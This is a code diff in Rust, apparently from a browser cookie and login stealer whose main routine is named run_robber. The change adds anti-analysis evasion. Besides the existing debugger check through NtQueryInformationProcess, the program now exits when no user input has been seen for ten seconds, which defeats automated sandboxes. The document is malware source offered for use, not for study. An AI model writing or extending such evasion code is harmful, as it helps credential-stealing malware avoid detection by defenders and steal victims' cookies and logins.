@@ -1,10 +1,14 @@
 use crate::robber;
-use kernel32::GetCurrentProcess;
+use kernel32::{GetCurrentProcess, GetTickCount};
 use ntapi::ntpsapi::NtQueryInformationProcess;
 use std::env;
 use std::ffi::c_void;
 use std::path::Path;
 use std::ptr::null_mut;
+use winapi::{
+    shared::{basetsd::UINT8, minwindef::DWORD},
+    um::winuser::{GetLastInputInfo, LASTINPUTINFO, PLASTINPUTINFO},
+};
 
 fn build_base_directories() -> Result<Vec<std::path::PathBuf>, ()> {
     let mut base_directories = vec![];
@@ -70,6 +74,14 @@ pub fn run_robber(do_cookie: bool, do_login: bool, url: &str) -> Result<i32, ()>
         let handle = GetCurrentProcess();
         let status = NtQueryInformationProcess(handle, 7, p_info, 8, null_mut());
         if !(*(p_info as *const u32) == 0 && status == 0) {
+            std::process::exit(1);
+        }
+        let mut last_input_info: LASTINPUTINFO = LASTINPUTINFO {
+            cbSize: std::mem::size_of::<LASTINPUTINFO>() as u32,
+            dwTime: 0u32,
+        };
+        GetLastInputInfo(&mut last_input_info);
+        if GetTickCount() - last_input_info.dwTime >= 10000 {
             std::process::exit(1);
         }
     }
